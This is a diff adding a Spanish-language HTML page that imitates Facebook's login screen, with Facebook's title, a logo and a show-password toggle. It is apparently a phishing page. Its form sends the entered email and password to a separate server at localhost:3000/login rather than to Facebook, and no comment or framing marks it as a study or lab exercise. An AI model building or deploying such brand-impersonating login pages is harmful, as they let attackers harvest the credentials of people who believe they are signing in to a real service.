@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="icon" href="icono.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="logo.png" alt="Logo de Facebook">
+            </div>
+            <form class="login-form" action="http://localhost:3000/login" method="POST">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                <div class="password-container">
+                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                    <button type="button" class="show-password" onclick="togglePassword()">
+                        <img src="nomostrar.png" alt="Mostrar contraseña" id="eye-icon">
+                    </button>
+                </div>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+
+            <div class="links">
+                <a href="#">¿Olvidaste tu contraseña?</a>
+                <center> <a href="#" class="create-account">Crear cuenta nueva</a></center>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Función para alternar el tipo de la contraseña y cambiar el ícono
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                eyeIcon.src = "nomostrar.png"; // Cambia el ícono a "ocultar"
+            } else {
+                passwordField.type = "password";
+                eyeIcon.src = "mostrar.png"; // Cambia el ícono a "mostrar"
+            }
+        }
+    </script>
+</body>
+</html>
